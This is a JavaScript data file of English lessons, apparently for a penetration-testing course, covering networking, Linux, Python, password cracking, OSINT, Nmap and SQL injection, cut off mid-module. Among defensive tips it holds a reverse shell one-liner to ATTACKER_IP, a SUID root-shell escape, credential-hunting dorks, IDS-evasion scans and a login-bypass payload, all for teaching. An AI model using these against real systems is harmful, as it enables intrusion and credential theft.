/**
 * BZT Cyber Security - English Curriculum Translations (v4.0 ENTERPRISE)
 * 16 Modules, 64 Comprehensive Training Sections, Real-world Quizzes & Lab Scenarios
 */

const CURRICULUM_EN = {
  "net-foundations": {
    "phaseTitle": "Phase 1: Foundations & Infrastructure",
    "title": "Network Architecture, TCP/IP, OSI & Packet Anatomy",
    "difficulty": "Beginner",
    "duration": "50 min",
    "summary": "A hacker without networking mastery is blind. Master the TCP 3-Way Handshake, OSI 7-Layer model, DNS hierarchy, ARP poisoning, and packet headers in depth.",
    "sections": [
      {
        "heading": "1. OSI Model & Layer-Based Attack Surfaces",
        "content": "In cyber security, every attack vector exploits vulnerabilities within specific layers of the OSI model:\n- Layer 2 (Data Link): MAC Addresses and ARP protocol. Attacks: ARP Spoofing/Poisoning, MAC Flooding, CAM Table Overflow, VLAN Hopping.\n- Layer 3 (Network): IP Addressing, Routing and ICMP. Attacks: IP Spoofing, Smurf Attack, Ping of Death, BGP Hijacking.\n- Layer 4 (Transport): TCP & UDP protocols, port management. Attacks: SYN Flood DoS, Stealth Port Scans (SYN Scan, FIN Scan), RST Injection.\n- Layer 7 (Application): HTTP/HTTPS, DNS, SSH, FTP, SMTP. Attacks: Web Injections (SQLi, XSS), DNS Cache Poisoning, Man-in-the-Middle (MitM).",
        "codeSnippet": "# Tshark ile ağ arabirimindeki ham TCP paket başlıklarını filtreleme\nsudo tshark -i eth0 -f \"tcp port 80 or tcp port 443\" -T fields -e ip.src -e ip.dst -e tcp.flags -e frame.len",
        "tip": "Nmap runs SYN Scan (-sS) by default with root privileges. By deliberately refusing to complete the 3-Way Handshake, it avoids creating established connection logs on the target.",
        "terminalCommand": "nmap -sS -p 80,443,8080 192.168.1.1"
      },
      {
        "heading": "2. TCP 3-Way Handshake & Flag Anatomy",
        "content": "Reliable TCP communication begins with a 3-step handshake:\n1. SYN (Synchronize): The client sets a random Initial Sequence Number (ISN) and sends a SYN packet to the target.\n2. SYN-ACK (Synchronize-Acknowledge): The server accepts, returning its own ISN and client ISN+1.\n3. ACK (Acknowledge): The client confirms the server's sequence number and the socket enters the ESTABLISHED state.\n\nCritical TCP Flags:\n- SYN: Connection initiation request\n- ACK: Data delivery acknowledgment\n- FIN: Graceful connection teardown\n- RST: Immediate forced connection termination\n- PSH: Immediate push to application buffer\n- URG: Urgent pointer flag",
        "codeSnippet": "# Python Scapy ile ozel bayraklara sahip ham TCP SYN paketi uretimi\nfrom scapy.all import IP, TCP, send\npacket = IP(dst=\"192.168.1.50\")/TCP(dport=445, flags=\"S\", seq=1337)\nsend(packet, verbose=0)",
        "tip": "In TCP Reset (RST) injection attacks, an adversary calculates active sequence numbers to inject forged RST packets, forcibly severing active enterprise sessions.",
        "terminalCommand": "netstat -nat"
      },
      {
        "heading": "3. Hands-on Packet Analysis & Raw Sockets with Scapy",
        "content": "Performing packet-level security inspection requires promiscuous interface capture and raw socket manipulation:\n- Essential Wireshark Display Filters:\n  * tcp.flags.syn == 1 and tcp.flags.ack == 0 (Isolate inbound connection SYN requests)\n  * http.request.method == \"POST\" (Inspect outbound web credential submissions)\n  * dns.flags.response == 0 (Analyze outbound DNS lookups)\n- Scapy allows crafting custom bit-level frames to validate IDS/IPS evasion and protocol boundary behaviors.",
        "codeSnippet": "# Scapy ile ICMP Ping ve ARP Taramasi\nfrom scapy.all import ARP, Ether, srp\nans, unans = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=\"192.168.1.0/24\"), timeout=2, verbose=0)\nfor snd, rcv in ans:\n    print(f\"[+] Canli Cihaz: {rcv.psrc} - MAC: {rcv.hwsrc}\")",
        "tip": "The ARP protocol lacks cryptographic authentication. Any station on the broadcast domain can broadcast gratuitous ARP replies claiming the default gateway IP (ARP Cache Poisoning).",
        "terminalCommand": "arp -a"
      },
      {
        "heading": "4. Network Defense: Dynamic ARP Inspection, SYN Cookies & Hardening",
        "content": "Building resilient network layer defense requires multi-tiered infrastructure controls:\n- Dynamic ARP Inspection (DAI): Switch-level enforcement validating ARP packets against the DHCP Snooping database to drop spoofed frames.\n- SYN Cookies: Mitigates SYN flood exhaustion by encoding connection state mathematically into the Initial Sequence Number without allocating memory backlog.\n- Stateful Packet Inspection (SPI): Restricts inbound flow strictly to ESTABLISHED and RELATED sessions, blocking unsolicited inbound packets.",
        "codeSnippet": "# Linux cekirdeginde SYN Flood korumasini (SYN Cookies) aktiflestirme\nsudo sysctl -w net.ipv4.tcp_syncookies=1\nsudo sysctl -w net.ipv4.tcp_max_syn_backlog=2048\nsudo sysctl -p",
        "tip": "Enforce Switchport Port-Security across enterprise access layers to bind single authorized MAC addresses, immediately disabling ports (err-disable) upon unauthorized device connection.",
        "terminalCommand": "iptables -L -n -v"
      }
    ],
    "quiz": {
      "question": "In an Nmap SYN Stealth Scan (-sS), which TCP flag combination returned by the target host indicates the destination port is open?",
      "options": [
        "SYN / ACK",
        "RST / ACK",
        "FIN / PSH",
        "ACK Only"
      ],
      "correct": 0,
      "explanation": "An open port responds to a SYN request with 'SYN/ACK'. Nmap captures this packet and instantly fires an RST packet to tear down the socket before a full connection is logged."
    }
  },
  "linux-bash-mastery": {
    "phaseTitle": "Phase 1: Foundations & Infrastructure",
    "title": "Linux Kernel, Special Permissions (SUID/SGID) & Bash Warfare",
    "difficulty": "Beginner",
    "duration": "60 min",
    "summary": "Linux is the native tongue of ethical hackers. Master file permissions (rwx, SUID, SGID), pipe chaining, grep/awk filtering, automation one-liners, and OS hardening.",
    "sections": [
      {
        "heading": "1. Linux Filesystem Hierarchy & Permission Model",
        "content": "In Linux, everything is treated as a file. The core permission model governs three entities with three permission bits:\n- Actors: User (u), Group (g), Others (o).\n- Permissions: Read (r = 4), Write (w = 2), Execute (x = 1).\n- Critical System Directories & Files:\n  * /etc/passwd: Global user accounts, UID/GID assignments, and login shells (world-readable).\n  * /etc/shadow: Salted password hashes for local users (restricted strictly to root).\n  * /etc/sudoers: Defines which accounts can elevate privileges via sudo with or without passwords.",
        "codeSnippet": "# Linux izinlerini octal (sayisal) ve sembolik olarak ayarlama\nchmod 750 /var/www/private_script.sh   # u=rwx, g=rx, o=hicbiri\nchown root:securitygroup /opt/audit.py  # Dosya sahibini ve grubunu degistir",
        "tip": "If /etc/passwd is inadvertently configured as world-writable, any low-privileged user can append a new account with UID 0 (root) to gain instant full root access.",
        "terminalCommand": "ls -la /etc/passwd /etc/shadow"
      },
      {
        "heading": "2. Special Permissions: SUID, SGID & Sticky Bit Exploitation",
        "content": "Beyond standard rwx bits, Linux provides special execution flags that frequently lead to local privilege escalation:\n- SUID (Set User ID - 4000): When invoked, the binary executes under the privileges of the FILE OWNER (typically root) rather than the launching user (-rwsr-xr-x).\n- SGID (Set Group ID - 2000): Executes under the group permissions of the binary (-rwxr-sr-x).\n- Sticky Bit (1000): Ensures only file creators or root can delete files within shared directories like /tmp (drwxrwxrwt).\n\nIf administrative binaries like /usr/bin/find or /usr/bin/vim carry the SUID bit, GTFOBins bypass techniques yield instant root shells!",
        "codeSnippet": "# Sistemdeki tum SUID bitine sahip dosyalari tespit etme\nfind / -perm -4000 -type f -exec ls -la {} + 2>/dev/null\n\n# find ikilisi uzerinden SUID istismari ile root shell acma\nfind . -exec /bin/sh -p \\; -quit",
        "tip": "GTFOBins is the definitive knowledge base curating how legitimate Unix binaries can be manipulated via SUID, sudo, or capabilities to bypass security restrictions.",
        "terminalCommand": "find / -perm -u=s -type f 2>/dev/null"
      },
      {
        "heading": "3. Bash One-Liners & Automation for Penetration Testing",
        "content": "Speed and situational awareness in penetration testing rely heavily on Bash pipelines and one-liners:\n- Native TCP Port Sweeping (Pure Bash without Nmap):\n  Leverage the /dev/tcp pseudo-filesystem to sweep IP ranges and identify listening services.\n- Headless Directory Fuzzing:\n  Combine curl and xargs to blast wordlists against web targets and isolate HTTP 200/301 responses.\n- Incident Log Triage:\n  Chain grep, awk, sort, and uniq -c to isolate aggressive scanning IPs from web access logs.",
        "codeSnippet": "# Saf Bash ile tek satirda 20-100 arasi portlari tarama\nfor p in {20..100}; do (echo >/dev/tcp/127.0.0.1/$p) >/dev/null 2>&1 && echo \"[+] Port $p ACIK\"; done\n\n# Web erisim logundan en cok istek atan ilk 5 IP adresini listeleme\nawk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head -5",
        "tip": "The classic reverse shell command 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' redirects an interactive bash session over a socket directly to an attacker's netcat listener.",
        "terminalCommand": "ps aux | grep root"
      },
      {
        "heading": "4. Linux System Hardening & Auditd Configuration",
        "content": "To harden Linux servers against compromise, defensive engineering requires structured operating system controls:\n- Sudoers Hardening: Never grant unrestricted 'NOPASSWD: ALL' to service or staff accounts. Restrict commands strictly by absolute binary paths.\n- SSH Daemon Hardening (/etc/ssh/sshd_config):\n  * PermitRootLogin no (Prohibits direct root login)\n  * PasswordAuthentication no (Mandates asymmetric public key authentication)\n  * MaxAuthTries 3 (Thwarts brute-force guessing attacks)\n- Kernel Audit Subsystem (Auditd): Monitor system calls and file modifications across /etc and sensitive binaries in real time.",
        "codeSnippet": "# Kritik sistem dosyalarini degisikliklere karsi izleyen Auditd kurali ekleme\nsudo auditctl -w /etc/passwd -p wa -k passwd_degisiklik\nsudo auditctl -w /etc/sudoers -p wa -k sudoers_degisiklik\nsudo ausearch -k passwd_degisiklik --format text",
        "tip": "Automated security scanners like Lynis evaluate hundreds of system configurations, kernel flags, and permission misconfigurations in minutes to generate a hardening index.",
        "terminalCommand": "sudo -l"
      }
    ],
    "quiz": {
      "question": "When a Linux binary has the SUID (4000) bit enabled, under whose permissions does it execute when launched?",
      "options": [
        "The file owner's privileges (typically root)",
        "The launching user's current privileges",
        "Always under the unprivileged 'nobody' account",
        "The system guest sandbox"
      ],
      "correct": 0,
      "explanation": "A binary with the SUID bit set executes with the privileges of the file owner rather than the calling user. If owned by root, it grants full root access during execution."
    }
  },
  "python-for-hackers": {
    "phaseTitle": "Phase 1: Foundations & Infrastructure",
    "title": "Python for Hackers & Exploit Development Basics",
    "difficulty": "Intermediate",
    "duration": "60 min",
    "summary": "When public tools fall short, real hackers write their own exploits. Master Python socket programming, multithreaded port sweeping, banner grabbing, and custom PoCs.",
    "sections": [
      {
        "heading": "1. Python Socket Programming & Network Communication",
        "content": "Python's greatest strength in offensive security is its native 'socket' module, allowing raw network communication without third-party dependencies:\n- AF_INET: Designates IPv4 socket addressing.\n- SOCK_STREAM: Creates a reliable, connection-oriented TCP socket.\n- SOCK_DGRAM: Establishes a connectionless UDP socket.\n- connect_ex(): Unlike connect(), it does not throw exceptions; it returns 0 on successful handshake or an error code (such as 111 Connection Refused) if closed.",
        "codeSnippet": "import socket\n\n# Basit bir TCP Port Kontrol Fonksiyonu\ndef check_port(host, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(1.0)\n    result = s.connect_ex((host, port))\n    s.close()\n    return result == 0  # 0 donerse port aciktir\n\nif check_port(\"127.0.0.1\", 80):\n    print(\"[+] 80 Nolu Port Acik!\")",
        "tip": "Calibrating socket timeouts accurately is vital: excessively brief timeouts trigger false negatives on distant targets, while long timeouts drastically degrade scan speed.",
        "terminalCommand": "python3 -c 'import socket; print(socket.__file__)'"
      },
      {
        "heading": "2. Multithreaded Port Scanner Architecture",
        "content": "Scanning 65,535 ports sequentially in a single thread takes hours. Multithreading enables massive concurrency:\n- threading.Thread: Spawns independent execution threads to test destination ports concurrently.\n- queue.Queue: Provides a synchronized, thread-safe FIFO pipeline dispatching target ports to active workers.\n- Worker Pattern: A managed worker pool (e.g. 50-100 threads) exhausts the task queue in seconds while avoiding socket exhaustion on the host OS.",
        "codeSnippet": "import socket, threading\nfrom queue import Queue\n\ntarget = \"127.0.0.1\"\nq = Queue()\n\ndef worker():\n    while not q.empty():\n        port = q.get()\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(0.5)\n        if s.connect_ex((target, port)) == 0:\n            print(f\"[+] Acik Port: {port}\")\n        s.close()\n        q.task_done()\n\n# Kuyruga 1-1024 arasi portlari doldur\nfor p in range(1, 1025): q.put(p)\n\n# 30 adet thread baslat\nfor _ in range(30):\n    t = threading.Thread(target=worker, daemon=True)\n    t.start()\nq.join()",
        "tip": "While Python's GIL restricts CPU-bound processing, I/O-bound operations like network socket handshakes release the lock, allowing near-linear multithreading speedups.",
        "terminalCommand": "python3 --version"
      },
      {
        "heading": "3. Banner Grabbing & HTTP Request Automation",
        "content": "Knowing a port is open is insufficient; discovering the precise software version running behind it enables targeted exploit selection:\n- Banner Grabbing: Capturing the unsolicited or probed welcome message returned by the daemon (e.g. Apache 2.4.49, OpenSSH 8.2p1, ProFTPD 1.3.5).\n- Requests Library: Powers web exploit payloads, custom HTTP header manipulation, stateful session cookie handling, and CSRF token parsing.",
        "codeSnippet": "import socket\n\n# Hedef servisin surum banner'ini yakalama\ndef grab_banner(ip, port):\n    try:\n        s = socket.socket()\n        s.settimeout(2.0)\n        s.connect((ip, port))\n        s.send(b\"HEAD / HTTP/1.0\\r\\n\\r\\n\")\n        banner = s.recv(1024).decode(errors=\"ignore\")\n        s.close()\n        return banner\n    except Exception as e:\n        return str(e)\n\nprint(grab_banner(\"127.0.0.1\", 80))",
        "tip": "Extracted daemon version strings can be queried directly against Exploit-DB or NIST NVD to discover public 1-day proof-of-concept exploits.",
        "terminalCommand": "python3 -c 'import requests; print(\"[+] Requests kutuphanesi hazir\")'"
      },
      {
        "heading": "4. Secure Python Development & Static Code Analysis",
        "content": "When building security tooling or performing source code review, several critical pitfalls must be guarded against:\n- eval() & exec() Insecurity: Executing dynamic strings containing unsanitized user input causes catastrophic Remote Code Execution (RCE).\n- Insecure Deserialization (pickle): Unpickling payloads from untrusted network sources executes arbitrary code via the __reduce__ magic method.\n- os.system() Vulnerabilities: Replace with subprocess.run(..., shell=False) with strictly typed argument arrays to prevent shell command injection.",
        "codeSnippet": "# Bandit araci ile Python kodlarindaki guvenlik aciklarini statik olarak tarama\n# Kurulum: pip install bandit\n# Calistirma: bandit -r /proje_dizini/ -ll -v",
        "tip": "Never serialize untrusted state with Python pickle; enforce strict JSON encoding or cryptographically signed protocol buffers.",
        "terminalCommand": "python3 -c 'import sys; print(f\"Python Surumu: {sys.version}\")'"
      }
    ],
    "quiz": {
      "question": "In Python's socket library, what integer value does 'socket.connect_ex((ip, port))' return when a TCP handshake succeeds?",
      "options": [
        "0 (Zero)",
        "1 (One)",
        "True (Boolean)",
        "-1 (Negative One)"
      ],
      "correct": 0,
      "explanation": "In accordance with standard C socket APIs, connect_ex() returns 0 upon a successful connection. If the port is closed or unreachable, it returns the specific OS errno integer."
    }
  },
  "cryptography-hashing": {
    "phaseTitle": "Phase 1: Foundations & Infrastructure",
    "title": "Cryptography, Hash Cracking & Password Security",
    "difficulty": "Intermediate",
    "duration": "55 min",
    "summary": "Master the fundamental distinction between encryption and cryptographic hashing. Symmetric/Asymmetric cryptosystems, GPU-accelerated hash cracking with Hashcat, and salting.",
    "sections": [
      {
        "heading": "1. Encryption vs Cryptographic Hashing",
        "content": "The two most crucial mathematical primitives in security architecture:\n- Encryption (Two-Way): Transforms plaintext into ciphertext using a secret key. Possession of the corresponding key allows decryption back into plaintext:\n  * Symmetric: A single shared secret handles encryption and decryption (AES-256-GCM, ChaCha20-Poly1305). Extremely high throughput.\n  * Asymmetric: Relies on mathematically linked public/private key pairs (RSA, ECC/ECDSA) for secure key exchange and digital signatures.\n- Cryptographic Hashing (One-Way): Compresses arbitrary input streams into fixed-width cryptographic digests. Mathematically irreversible (MD5, SHA-256, SHA-3).",
        "codeSnippet": "# Linux terminalinde SHA-256 ve MD5 ozetleri uretme\necho -n \"GizliParola123!\" | sha256sum\necho -n \"GizliParola123!\" | md5sum",
        "tip": "Cryptographic hash algorithms exhibit the 'Avalanche Effect': mutating a single bit in the input radically scrambles over 50% of the resultant output digest.",
        "terminalCommand": "openssl dgst -sha256 /etc/issue"
      },
      {
        "heading": "2. Password Hashes, Rainbow Tables & Salting",
        "content": "Unsalted password hashes are trivially crackable by adversaries:\n- Rainbow Tables: Precomputed look-up tables containing hundreds of billions of hash-to-plaintext pairings. Unsalted MD5, SHA-1, or NTLM hashes resolve in sub-seconds.\n- Salting: Appending a cryptographically secure random string (salt) unique to each individual user prior to hashing:\n  Digest = SHA256(Password + Unique_Salt)\n  This renders universal lookup tables and precomputed rainbow tables completely useless.",
        "codeSnippet": "# Python ile guvenli tuzlanmis parola hash'i olusturma (bcrypt)\nimport bcrypt\npassword = b\"BZT_Guvenli_Parola!2026\"\nsalt = bcrypt.gensalt(rounds=12)\nhashed = bcrypt.hashpw(password, salt)\nprint(f\"[+] Guvenli Hash: {hashed.decode()}\")",
        "tip": "MD5 and SHA-1 suffer from proven practical collision attacks. For credential persistence, enforce modern memory-hard key derivation functions like Argon2id or Bcrypt.",
        "terminalCommand": "cat /etc/login.defs | grep ENCRYPT_METHOD"
      },
      {
        "heading": "3. GPU-Accelerated Hash Cracking with Hashcat",
        "content": "Hashcat is the industry-standard benchmark for high-velocity hash recovery, distributing compute kernels across GPU cores:\n- Attack Modes (-a):\n  * -a 0: Straight Wordlist Attack (e.g. rockyou.txt)\n  * -a 3: Pure Brute-force / Custom Charset Mask Attack\n  * -a 1: Combinator Attack (cross-multiplying two wordlists)\n- Key Hash Identifiers (-m):\n  * -m 0: Raw MD5\n  * -m 1000: NTLM (Windows Active Directory & SAM hashes)\n  * -m 1800: SHA-512 crypt (Linux /etc/shadow $6$)\n  * -m 22000: WPA-PBKDF2-PMKID (Modern WiFi WPA/WPA2 capture)",
        "codeSnippet": "# NTLM hash'ini RockYou kelime listesi ile kirmak\nhashcat -m 1000 -a 0 target_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# 8 karakterli ve son iki hanesi sayi olan maske saldirisi (?l: kucuk harf, ?d: rakam)\nhashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?d?d",
        "tip": "Rule-based cracking (-r rules/best64.rule) mutates candidate wordlist entries on the fly, applying leetspeak substitutions, appending numerals, and capitalizing tokens.",
        "terminalCommand": "hashcat --help | head -20"
      },
      {
        "heading": "4. Modern Password Security: Argon2, PBKDF2 & MFA/FIDO2",
        "content": "Hardening identity providers against offline GPU cracking clusters requires modern key derivation standards:\n- Key Stretching: Iterating hashes tens of thousands of times to intentionally force computational delay (PBKDF2, Scrypt).\n- Argon2id: Winner of the Password Hashing Competition (PHC), balancing side-channel resistance with extreme memory-hardness to thwart ASICs and GPUs.\n- Passwordless Infrastructure (FIDO2 / WebAuthn): Eliminates shared credentials entirely, delegating authentication to public-key cryptography on physical hardware tokens.",
        "codeSnippet": "# Python ile Argon2id kullanarak parola hashleme\nfrom argon2 import PasswordHasher\nph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=4)\nhashed = ph.hash(\"CokGizliSifre2026!\")\nprint(f\"[+] Argon2id Hash: {hashed}\")",
        "tip": "Enforce Multi-Factor Authentication via TOTP authenticators or FIDO2 hardware tokens rather than SMS, which is notoriously susceptible to SIM swapping and SS7 interception.",
        "terminalCommand": "openssl version"
      }
    ],
    "quiz": {
      "question": "Which cryptographic mechanism incorporates unique pseudorandom data per credential to render Rainbow Table lookups ineffective?",
      "options": [
        "Salting",
        "Asymmetric Encryption",
        "Format-Preserving Encryption",
        "Compression"
      ],
      "correct": 0,
      "explanation": "Salting introduces unique pseudorandom bytes into the input stream prior to hashing. Identical passwords yield distinct digests, entirely neutralizing precomputed lookup databases."
    }
  },
  "osint-recon-deep": {
    "phaseTitle": "Phase 2: Reconnaissance & OSINT",
    "title": "Passive Recon, OSINT & Open Source Intelligence",
    "difficulty": "Beginner",
    "duration": "45 min",
    "summary": "Uncover infrastructure secrets, exposed credentials, subdomains, and corporate topologies without touching the target. Google Dorking, Shodan, crt.sh, and Whois.",
    "sections": [
      {
        "heading": "1. Passive Reconnaissance Methodology & Digital Footprints",
        "content": "Up to 80% of a successful penetration test or adversary campaign succeeds during the reconnaissance phase:\n- Passive Recon: Zero packets are transmitted directly to the target infrastructure. All intelligence is mined from public third-party telemetry, leaving zero forensic trace on target SIEM/IDS.\n- Active Recon: Direct interaction with destination interfaces (port scanning, web fuzzing) generating immediate network perimeter logs.\n- Primary Objectives: Organization domains, subdomains, employee email schemas, ASN blocks, and inadvertently exposed configuration files.",
        "codeSnippet": "# Whois ve DNS sorgusu ile hedef IP blogunu ve kayitli ASN bilgisini bulma\nwhois targetdomain.com | grep -E \"Registrar|Name Server|Admin Email\"\ndig ANY targetdomain.com +nocmd +noall +answer",
        "tip": "Services like Netcraft and SecurityTrails archive historical DNS records, revealing origin server IPs that directly bypass Cloudflare CDN/WAF proxies.",
        "terminalCommand": "whois google.com | head -15"
      },
      {
        "heading": "2. Advanced Google Dorking & Sensitive Data Hunting",
        "content": "Search engine web spiders index thousands of misconfigured endpoints daily. Advanced search operators (Google Dorks) surface critical data:\n- site: Constrains results strictly to the specified domain boundary (site:target.com).\n- filetype: Filters strictly by extension (filetype:env, filetype:sql, filetype:pem).\n- inurl: Targets specific tokens within URI paths (inurl:admin, inurl:setup.php).\n- intitle: Queries HTML title attributes (intitle:\"index of\" \"database.sqlite\").\n- ext:conf OR ext:log: Isolates exposed environment files and internal logs.",
        "codeSnippet": "# Kritik Google Dork kaliplari\nsite:hedef.com ext:env OR ext:yml OR ext:json \"DB_PASSWORD\"\nsite:hedef.com inurl:login intitle:\"admin portal\"\nsite:hedef.com filetype:sql \"INSERT INTO\" \"password\"",
        "tip": "The Google Hacking Database (GHDB) curated by Exploit-DB catalogs thousands of actionable dork queries exposing cameras, portals, and credentials.",
        "terminalCommand": "curl -sI https://www.google.com | head -5"
      },
      {
        "heading": "3. DNS Intelligence, Subdomain Enumeration & crt.sh",
        "content": "While corporate primary domains undergo regular auditing, dev, staging, and legacy subdomains frequently remain unpatched and vulnerable:\n- Certificate Transparency (crt.sh): CA-mandated public transparency logs document every SSL certificate issued, exposing private subdomains instantly.\n- Subdomain Enumeration: Tooling like Amass, Subfinder, and Assetfinder cross-reference passive APIs and brute-force wordlists.\n- DNS Zone Transfer (AXFR): A misconfigured nameserver readily dumps the complete corporate zone record to an adversary via a single dig command.",
        "codeSnippet": "# crt.sh uzerinden hedef domaine ait alt alan adlarini tek satirda cekme\ncurl -s \"https://crt.sh/?q=%25.hedef.com&output=json\" | jq -r '.[].name_value' | sort -u\n\n# DNS Zone Transfer zafiyeti testi (AXFR)\ndig axfr @ns1.hedef.com hedef.com",
        "tip": "Subdomain Takeover: If a CNAME record points to a deleted cloud resource (AWS S3, Azure, Heroku), an attacker can register the abandoned resource and control the subdomain.",
        "terminalCommand": "host -t ns google.com"
      },
      {
        "heading": "4. Digital Footprint Hygiene, Breach Analysis & OPSEC",
        "content": "Operational Security (OPSEC) and credential spill analysis form the bedrock of elite intelligence operations:\n- Breach Monitoring: Platforms like HaveIBeenPwned and DeHashed aggregate credential dumps, pinpointing compromised employee credentials.\n- Shodan & Censys: Internet-wide port scanning engines indexing banners, vulnerable IoT assets, and perimeter firewalls without firing a single probe.\n- OPSEC Hygiene: Real-world investigative work demands strict sock-puppet persona segregation, burner VMs, and non-attributable network routing.",
        "codeSnippet": "# Shodan CLI ile hedef organizasyona ait acik servisleri sorgulama\n# shodan search org:\"Hedef Sirket\" --fields ip_str,port,org\nshodan host 8.8.8.8",
        "tip": "A target's 'robots.txt' is an OSINT goldmine: administrators frequently list sensitive administrative paths they wish to conceal from public search indexing.",
        "terminalCommand": "curl -s https://en.wikipedia.org/robots.txt | head -10"
      }
    ],
    "quiz": {
      "question": "Which widely used web service queries public Certificate Transparency (CT) logs to passively map corporate subdomains?",
      "options": [
        "crt.sh",
        "sqlmap.org",
        "nmap.online",
        "hashcat.net"
      ],
      "correct": 0,
      "explanation": "crt.sh parses public Certificate Transparency logs, cataloging every SSL/TLS certificate ever issued for a domain and uncovering private subdomains effortlessly."
    }
  },
  "active-recon-nmap": {
    "phaseTitle": "Phase 2: Reconnaissance & OSINT",
    "title": "Network Reconnaissance with Nmap & NSE Scripting",
    "difficulty": "Intermediate",
    "duration": "60 min",
    "summary": "Master the legendary scanner of offensive security. SYN Stealth, UDP scans, version probing, OS fingerprinting, NSE vulnerability scripts, and IDS evasion.",
    "sections": [
      {
        "heading": "1. Nmap Scan Types & TCP Flag Dynamics",
        "content": "Nmap evaluates target responses to distinct TCP/UDP flag sequences to ascertain network port states:\n- SYN Stealth Scan (-sS): Default privileged scan. Sends SYN; receiving SYN/ACK proves the port is open; immediately terminates with RST to avoid connection logging.\n- TCP Connect Scan (-sT): Unprivileged mode utilizing the OS connect() API, completing the entire 3-way handshake and leaving full application connection logs.\n- UDP Scan (-sU): Probes UDP services. Lack of response implies 'open|filtered'; an ICMP Port Unreachable (Type 3, Code 3) packet proves the port is closed.\n- RFC Boundary Scans:\n  * FIN Scan (-sF): Sends only the FIN flag.\n  * Xmas Scan (-sX): Lights up FIN, PSH, and URG flags simultaneously.\n  * Null Scan (-sN): Transmits packets with zero flags set.",
        "codeSnippet": "# Hizli ve eksiksiz bir temel port taramasi\nsudo nmap -sS -p- --min-rate 1000 -T4 -oN initial_scan.txt 192.168.1.50",
        "tip": "Because Windows network stacks deviate from RFC 793, they drop Null/FIN/Xmas probes on closed ports rather than sending RSTs, falsely classifying all ports as open.",
        "terminalCommand": "nmap -sS -p 22,80,443 127.0.0.1"
      },
      {
        "heading": "2. Service Version Detection & OS Fingerprinting (-sV, -O)",
        "content": "An open port indicates access; exact software versions determine actionable exploits:\n- Version Detection (-sV): Dispatches curated probes to the open socket. Replies are regex-matched against the vast nmap-service-probes database to isolate vendor and version strings.\n- OS Fingerprinting (-O): Analyzes nuanced implementation variations in the target's IP stack (TCP Window sizing, IP ID sequencing, TTL behaviors) to determine the precise kernel/OS build.",
        "codeSnippet": "# Servis versiyonu, isletim sistemi ve varsayilan scriptlerle agresif tarama\nsudo nmap -sV -O -sC -p 21,22,80,445 -oA deep_scan 192.168.1.50",
        "tip": "The --version-intensity flag accepts values from 0 to 9. Level 9 tests every known probe regex, delivering thorough version intelligence at the cost of scan duration.",
        "terminalCommand": "nmap -sV -p 80 127.0.0.1"
      },
      {
        "heading": "3. Nmap Scripting Engine (NSE) & Automated Vulnerability Scanning",
        "content": "The Nmap Scripting Engine (NSE) leverages embedded Lua interpreters to transform Nmap into a modular vulnerability scanner:\n- Script Categories:\n  * vuln: Actively checks for critical CVEs (e.g. MS17-010 EternalBlue, Log4j, Heartbleed).\n  * auth: Evaluates authentication weaknesses, anonymous logins, and default credentials.\n  * discovery: Enriches service enumeration (SMB shares, NFS exports, HTTP directories).\n  * exploit: Attempts controlled exploitation of detected vulnerabilities.\n  * safe: Verified scripts guaranteed not to crash sensitive production services.",
        "codeSnippet": "# Hedefteki bilinen tum zafiyetleri tarama\nsudo nmap --script vuln -p 80,443,445 192.168.1.50\n\n# SMB zafiyetlerini (EternalBlue vb.) hedefleyen ozel script calistirma\nsudo nmap -p 445 --script smb-vuln-ms17-010 192.168.1.50",
        "tip": "All built-in scripts reside in /usr/share/nmap/scripts/. You can author custom Lua scripts and drop them into this directory to automate bespoke audit workflows.",
        "terminalCommand": "ls -l /usr/share/nmap/scripts/ | head -10"
      },
      {
        "heading": "4. Firewall & IDS/IPS Evasion Techniques",
        "content": "Enterprise next-generation firewalls and IDS/IPS appliances swiftly ban aggressive scanner IPs. Advanced evasion options bypass these controls:\n- Packet Fragmentation (-f): Splits TCP headers across 8-byte MTU fragments to confound stateless inspection rules.\n- Decoys (-D): Spoofs additional decoy source IPs alongside your real IP, cloaking your identity in destination SIEM alerts.\n- Source Port Spoofing (--source-port 53): Exploits lax egress firewall policies that unconditionally trust incoming traffic from DNS (53) or NTP (123).\n- Timing Templates (-T0 Paranoid, -T1 Sneaky): Injects deliberate delays between packet transmissions to stay beneath threshold-based anomaly detection limits.",
        "codeSnippet": "# IDS atlatma: Paket parcalama, yem IP'ler ve kaynak portu 53 olarak ayarlama\nsudo nmap -sS -Pn -f -D RND:5 --source-port 53 -p 80,443 192.168.1.50",
        "tip": "The -Pn flag disables initial ICMP host-discovery ping sweeps. It forces Nmap to proceed directly with port scans against firewalls that drop ICMP echo requests.",
        "terminalCommand": "nmap -Pn -p 80 127.0.0.1"
      }
    ],
    "quiz": {
      "question": "Which scan mode is used by default under root privileges in Nmap, minimizing target logging by avoiding a completed TCP connection?",
      "options": [
        "-sS (SYN Stealth Scan)",
        "-sT (TCP Connect Scan)",
        "-sU (UDP Scan)",
        "-sY (SCTP INIT Scan)"
      ],
      "correct": 0,
      "explanation": "-sS (SYN Stealth Scan) tears down the handshake with an RST rather than completing it with an ACK. This half-open mechanism avoids tripping socket connection handlers."
    }
  },
  "sqli-exploitation": {
    "phaseTitle": "Phase 3: Web Application Pentesting",
    "title": "SQL Injection: Union, Error, Blind & Time-Based",
    "difficulty": "Intermediate",
    "duration": "70 min",
    "summary": "Dive into the core of database architectures. UNION-based data extraction, Error-based leaks, Boolean Blind, Time-based latency, SQLMap exploitation, and Prepared Statements.",
    "sections": [
      {
        "heading": "1. Root Cause of SQL Injection & Authentication Bypass",
        "content": "SQL Injection (SQLi) occurs when untrusted user input is directly concatenated into dynamic SQL query strings without sanitization:\n- Fundamental Flaw: The boundary between data and code dissolves. Attackers inject single quotes (') or comment indicators (--) to alter query execution logic.\n- Classic Auth Bypass:\n  Query: SELECT * FROM users WHERE username = '$user' AND password = '$pass'\n  Input: admin' OR '1'='1' --\n  Evaluated: SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = '...'\n  The predicate always resolves to TRUE, bypassing authentication and granting admin privileges.",
